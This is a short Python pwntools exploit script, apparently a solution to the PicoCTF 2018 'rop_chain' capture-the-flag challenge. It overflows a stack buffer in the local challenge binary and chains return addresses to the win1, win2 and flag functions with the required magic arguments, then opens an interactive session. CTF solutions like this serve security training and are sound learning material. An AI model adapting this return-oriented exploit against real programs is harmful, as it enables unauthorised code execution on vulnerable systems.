from pwn import *
context(log_level='debug')
io = process("./PicoCTF_2018_rop_chain")
win1 = 0x80485CB
win2 = 0x80485D8
flag = 0x804862B
io.recv()
payload = 'a'*(0x18+4)+p32(win1) + p32(win2)+ p32(flag) + p32(0xBAAAAAAD) +p32(0xDEADBAAD) 
io.sendline(payload)
io.interactive()